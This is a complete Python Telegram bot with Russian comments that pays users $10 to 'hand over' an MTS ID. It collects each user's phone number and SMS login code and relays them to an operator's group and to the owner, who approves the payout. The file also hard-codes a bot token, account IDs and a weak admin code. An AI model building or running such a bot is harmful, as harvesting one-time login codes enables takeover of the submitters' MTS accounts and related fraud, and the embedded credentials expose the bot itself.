import asyncio
import logging
import aiosqlite
from datetime import datetime
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ================== НАСТРОЙКИ ==================
BOT_TOKEN = "9106636927:AAHYZwAyRlilXSacPyGway8S9oxYpoLmCGM"
OWNER_ID = 8874871486
GROUP_ID = -5448015222
SUPPORT_USERNAME = "@Sm_mts"

ADMIN_CODE = "0408"
DB_PATH = "bot.db"
# ===============================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# ================== БАЗА ДАННЫХ ==================
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                balance REAL DEFAULT 0,
                mts_count INTEGER DEFAULT 0,
                joined_at TEXT
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS withdraws (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount REAL,
                created_at TEXT
            )
        """)
        defaults = {
            "btn1": "📱 Сдать MTS ID",
            "btn2": "👤 Профиль",
            "btn3": "🆘 Поддержка",
            "desc1": "Сдать номер MTS и получить $10",
            "desc2": "Профиль и баланс",
            "desc3": "Связаться с поддержкой",
            "photo1": "",
            "photo2": "",
            "photo3": "",
            "bot_active": "1",
        }
        for k, v in defaults.items():
            await db.execute(
                "INSERT OR IGNORE INTO settings(key, value) VALUES (?, ?)", (k, v)
            )
        await db.commit()

async def get_setting(key: str, default: str = "") -> str:
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT value FROM settings WHERE key=?", (key,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else default

async def set_setting(key: str, value: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO settings(key, value) VALUES (?, ?) "
            "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
            (key, value)
        )
        await db.commit()

async def get_user(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT * FROM users WHERE user_id=?", (user_id,)) as cur:
            return await cur.fetchone()

async def ensure_user(user_id: int, username: str):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,)) as cur:
            if await cur.fetchone() is None:
                await db.execute(
                    "INSERT INTO users(user_id, username, balance, mts_count, joined_at) "
                    "VALUES (?, ?, 0, 0, ?)",
                    (user_id, username or "", datetime.now().strftime("%d.%m.%Y %H:%M"))
                )
                await db.commit()

async def update_user(user_id: int, **fields):
    if not fields:
        return
    keys = ", ".join(f"{k}=?" for k in fields)
    values = list(fields.values()) + [user_id]
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(f"UPDATE users SET {keys} WHERE user_id=?", values)
        await db.commit()

async def get_balance(user_id: int) -> float:
    row = await get_user(user_id)
    return row[2] if row else 0

async def get_mts_count(user_id: int) -> int:
    row = await get_user(user_id)
    return row[3] if row else 0

# ================== КЛАВИАТУРЫ ==================
async def main_kb() -> ReplyKeyboardMarkup:
    b1 = await get_setting("btn1", "📱 Сдать MTS ID")
    b2 = await get_setting("btn2", "👤 Профиль")
    b3 = await get_setting("btn3", "🆘 Поддержка")
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=b1)],
            [KeyboardButton(text=b2), KeyboardButton(text=b3)],
        ],
        resize_keyboard=True
    )

def owner_decision_kb(user_id: int, phone: str, code: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Да", callback_data=f"appr:{user_id}:{phone}:{code}"),
            InlineKeyboardButton(text="❌ Нет", callback_data=f"rej:{user_id}"),
        ]
    ])

def support_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Написать в поддержку",
                              url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}")]
    ])

def withdraw_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Вывести", callback_data="withdraw")]
    ])

def admin_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✏️ Название кнопок", callback_data="a_names"),
         InlineKeyboardButton(text="📝 Описание", callback_data="a_descs")],
        [InlineKeyboardButton(text="🎨 Цвет кнопок", callback_data="a_color"),
         InlineKeyboardButton(text="🖼 Фото кнопок", callback_data="a_photo")],
        [InlineKeyboardButton(text="⏯ Старт/Стоп бота", callback_data="a_toggle"),
         InlineKeyboardButton(text="📢 Объявление всем", callback_data="a_broadcast")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="a_stats")],
    ])

# ================== СОСТОЯНИЯ ==================
class UserStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_withdraw = State()

class AdminStates(StatesGroup):
    waiting_code = State()
    waiting_btn_names = State()
    waiting_btn_desc = State()
    waiting_btn_photo = State()
    waiting_broadcast = State()

# ================== СТАРТ ==================
@router.message(CommandStart())
async def start_cmd(message: Message):
    if await get_setting("bot_active") == "0" and message.from_user.id != OWNER_ID:
        await message.answer("🚫 Бот временно остановлен. Попробуйте позже.")
        return
    await ensure_user(message.from_user.id, message.from_user.username)
    await message.answer(
        "👋 Добро пожаловать!\n\nВыберите действие на клавиатуре ниже.",
        reply_markup=await main_kb()
    )

# ================== КНОПКА 1: СДАТЬ MTS ==================
@router.message(F.text)
async def text_router(message: Message, state: FSMContext):
    if await state.get_state() is not None:
        return
    b1 = await get_setting("btn1")
    b2 = await get_setting("btn2")
    b3 = await get_setting("btn3")

    if message.text == b1:
        if await get_setting("bot_active") == "0" and message.from_user.id != OWNER_ID:
            await message.answer("🚫 Бот временно остановлен.")
            return
        await ensure_user(message.from_user.id, message.from_user.username)
        await message.answer(
            "📱 Введите номер телефона MTS.\n\n"
            "Примеры:\n<code>+79999999999</code>\n<code>89999999999</code>\n<code>9999999999</code>"
        )
        await state.set_state(UserStates.waiting_phone)
    elif message.text == b2:
        await show_profile(message)
    elif message.text == b3:
        await message.answer(
            "🆘 Поддержка\n\nЧтобы написать в поддержку, нажмите на кнопку ниже.",
            reply_markup=support_kb()
        )
    elif message.text == "💸 Вывести":
        await state.set_state(UserStates.waiting_withdraw)
        await message.answer("Введите сумму для вывода (в $):")
    else:
        await message.answer("Пожалуйста, используйте кнопки меню.", reply_markup=await main_kb())

@router.message(UserStates.waiting_phone)
async def phone_handler(message: Message, state: FSMContext):
    phone_raw = message.text.strip()
    digits = "".join(ch for ch in phone_raw if ch.isdigit())
    if len(digits) < 10:
        await message.answer("❌ Неверный формат номера. Попробуйте снова.")
        return
    if len(digits) == 10:
        phone = "+7" + digits
    elif len(digits) == 11 and digits.startswith("8"):
        phone = "+7" + digits[1:]
    elif len(digits) == 11 and digits.startswith("7"):
        phone = "+" + digits
    else:
        phone = "+" + digits

    await state.update_data(phone=phone)
    await state.set_state(UserStates.waiting_code)
    await message.answer("📩 Теперь введите код из SMS:")

@router.message(UserStates.waiting_code)
async def code_handler(message: Message, state: FSMContext):
    code = message.text.strip()
    data = await state.get_data()
    phone = data.get("phone", "")
    await state.clear()

    user = message.from_user
    await ensure_user(user.id, user.username)

    try:
        await bot.send_message(
            GROUP_ID,
            f"📥 <b>Новая заявка MTS ID</b>\n\n"
            f"📱 Номер: <code>{phone}</code>\n"
            f"🔑 Код: <code>{code}</code>\n\n"
            f"👤 Пользователь: @{user.username or 'нет'} (id: {user.id})"
        )
    except Exception as e:
        logging.error(f"group send error: {e}")

    await message.answer("⏳ Ожидайте проверки номера.")

    try:
        await bot.send_message(
            OWNER_ID,
            f"🆕 <b>Заявка MTS ID</b>\n\n"
            f"📱 Номер: <code>{phone}</code>\n"
            f"🔑 Код: <code>{code}</code>\n"
            f"👤 @{user.username or 'нет'} (id: <code>{user.id}</code>)",
            reply_markup=owner_decision_kb(user.id, phone, code)
        )
    except Exception as e:
        logging.error(f"owner send error: {e}")

@router.callback_query(F.data.startswith("appr:"))
async def approve_cb(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        await call.answer("Нет доступа", show_alert=True)
        return
    _, user_id, phone, code = call.data.split(":", 3)
    user_id = int(user_id)
    await update_user(user_id, balance=(await get_balance(user_id)) + 10,
                      mts_count=(await get_mts_count(user_id)) + 1)
    try:
        await bot.send_message(user_id, "✅ Ваш номер проверен! Начислено $10.")
    except Exception as e:
        logging.error(f"notify approve: {e}")
    await call.message.edit_text(call.message.text + "\n\n✅ <b>Одобрено</b>")

@router.callback_query(F.data.startswith("rej:"))
async def reject_cb(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        await call.answer("Нет доступа", show_alert=True)
        return
    _, user_id = call.data.split(":", 1)
    user_id = int(user_id)
    try:
        await bot.send_message(user_id, "❌ Произошла ошибка, попробуйте позже.")
    except Exception as e:
        logging.error(f"notify reject: {e}")
    await call.message.edit_text(call.message.text + "\n\n❌ <b>Отклонено</b>")

# ================== КНОПКА 2: ПРОФИЛЬ ==================
async def show_profile(message: Message):
    await ensure_user(message.from_user.id, message.from_user.username)
    row = await get_user(message.from_user.id)
    if not row:
        await message.answer("Профиль не найден.")
        return
    _, username, balance, mts_count, joined_at = row
    text = (
        f"👤 <b>Ваш профиль</b>\n\n"
        f"💰 Баланс: <b>${balance:.2f}</b>\n"
        f"📱 Сдано MTS: <b>{mts_count}</b>\n"
        f"📅 В боте с: <b>{joined_at}</b>"
    )
    await message.answer(text, reply_markup=withdraw_kb())

@router.callback_query(F.data == "withdraw")
async def withdraw_cb(call: CallbackQuery, state: FSMContext):
    await state.set_state(UserStates.waiting_withdraw)
    await call.message.answer("Введите сумму для вывода (в $):")
    await call.answer()

@router.message(UserStates.waiting_withdraw)
async def withdraw_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(",", ".").strip())
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Введите корректную сумму.")
        return

    await ensure_user(message.from_user.id, message.from_user.username)
    balance = await get_balance(message.from_user.id)
    if amount > balance:
        await message.answer("❌ Недостаточно средств на балансе.")
        await state.clear()
        return

    await update_user(message.from_user.id, balance=balance - amount)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO withdraws(user_id, amount, created_at) VALUES (?, ?, ?)",
            (message.from_user.id, amount, datetime.now().strftime("%d.%m.%Y %H:%M"))
        )
        await db.commit()

    await state.clear()
    await message.answer("⏳ Ожидайте вывод.")

    try:
        await bot.send_message(
            OWNER_ID,
            f"💸 <b>Заявка на вывод</b>\n\n"
            f"💰 Сумма: <b>${amount:.2f}</b>\n"
            f"👤 @{message.from_user.username or 'нет'} (id: <code>{message.from_user.id}</code>)"
        )
    except Exception as e:
        logging.error(f"withdraw notify: {e}")

# ================== АДМИН-ПАНЕЛЬ ==================
@router.message(Command("admin"))
async def admin_cmd(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        return
    await message.answer("🔐 Введите код администратора:")
    await state.set_state(AdminStates.waiting_code)

@router.message(AdminStates.waiting_code)
async def admin_code(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        return
    if message.text.strip() != ADMIN_CODE:
        await message.answer("❌ Неверный код.")
        await state.clear()
        return
    await state.clear()
    await message.answer("✅ Добро пожаловать в админ-панель.", reply_markup=admin_kb())

@router.callback_query(F.data == "a_names")
async def a_names(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return
    await state.set_state(AdminStates.waiting_btn_names)
    await call.message.answer(
        "Введите три названия через <b>|</b>:\n<i>Кнопка1|Кнопка2|Кнопка3</i>"
    )
    await call.answer()

@router.message(AdminStates.waiting_btn_names)
async def set_names(message: Message, state: FSMContext):
    parts = [p.strip() for p in message.text.split("|")]
    if len(parts) != 3:
        await message.answer("Нужно ровно 3 значения через |")
        return
    await set_setting("btn1", parts[0])
    await set_setting("btn2", parts[1])
    await set_setting("btn3", parts[2])
    await state.clear()
    await message.answer("✅ Названия обновлены.", reply_markup=await main_kb())

@router.callback_query(F.data == "a_descs")
async def a_descs(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return
    await state.set_state(AdminStates.waiting_btn_desc)
    await call.message.answer("Введите три описания через <b>|</b>:")
    await call.answer()

@router.message(AdminStates.waiting_btn_desc)
async def set_descs(message: Message, state: FSMContext):
    parts = [p.strip() for p in message.text.split("|")]
    if len(parts) != 3:
        await message.answer("Нужно ровно 3 значения через |")
        return
    await set_setting("desc1", parts[0])
    await set_setting("desc2", parts[1])
    await set_setting("desc3", parts[2])
    await state.clear()
    await message.answer("✅ Описания обновлены.")

@router.callback_query(F.data == "a_color")
async def a_color(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return
    await call.message.answer(
        "🎨 В Telegram нельзя менять цвет кнопок напрямую.\n"
        "Можно использовать эмодзи перед текстом кнопки (например 🔵, 🟢, 🟡).\n"
        "Используйте «Название кнопок» и добавьте эмодзи в нужный цвет."
    )
    await call.answer()

@router.callback_query(F.data == "a_photo")
async def a_photo(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return
    await state.set_state(AdminStates.waiting_btn_photo)
    await call.message.answer(
        "🖼 Отправьте фото и укажите кнопку (1/2/3) в подписи.\n"
        "Пример подписи: <code>1</code>"
    )
    await call.answer()

@router.message(AdminStates.waiting_btn_photo, F.photo)
async def set_photo(message: Message, state: FSMContext):
    idx = (message.caption or "").strip()
    if idx not in ("1", "2", "3"):
        await message.answer("Укажите в подписи 1, 2 или 3.")
        return
    file_id = message.photo[-1].file_id
    await set_setting(f"photo{idx}", file_id)
    await state.clear()
    await message.answer(f"✅ Фото для кнопки {idx} сохранено.")

@router.callback_query(F.data == "a_toggle")
async def a_toggle(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return
    cur = await get_setting("bot_active", "1")
    new = "0" if cur == "1" else "1"
    await set_setting("bot_active", new)
    status = "🟢 Запущен" if new == "1" else "🔴 Остановлен"
    await call.message.answer(f"Бот: {status}")
    await call.answer()

@router.callback_query(F.data == "a_broadcast")
async def a_broadcast(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return
    await state.set_state(AdminStates.waiting_broadcast)
    await call.message.answer("Введите текст объявления:")
    await call.answer()

@router.message(AdminStates.waiting_broadcast)
async def broadcast(message: Message, state: FSMContext):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id FROM users") as cur:
            users = await cur.fetchall()
    ok = 0
    for (uid,) in users:
        try:
            await bot.send_message(uid, f"📢 <b>Объявление</b>\n\n{message.text}")
            ok += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await state.clear()
    await message.answer(f"✅ Отправлено: {ok} из {len(users)}")

@router.callback_query(F.data == "a_stats")
async def a_stats(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT COUNT(*) FROM users") as cur:
            total = (await cur.fetchone())[0]
        async with db.execute("SELECT COALESCE(SUM(balance),0) FROM users") as cur:
            total_bal = (await cur.fetchone())[0]
        async with db.execute("SELECT COALESCE(SUM(mts_count),0) FROM users") as cur:
            total_mts = (await cur.fetchone())[0]
        async with db.execute("SELECT COUNT(*), COALESCE(SUM(amount),0) FROM withdraws") as cur:
            wc, wsum = await cur.fetchone()
    text = (
        f"📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: <b>{total}</b>\n"
        f"💰 Общий баланс: <b>${total_bal:.2f}</b>\n"
        f"📱 Сдано MTS: <b>{total_mts}</b>\n"
        f"💸 Заявок на вывод: <b>{wc}</b> на сумму <b>${wsum:.2f}</b>"
    )
    await call.message.answer(text)
    await call.answer()

# ================== ЗАПУСК ==================
async def main():
    await init_db()
    logging.info("Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
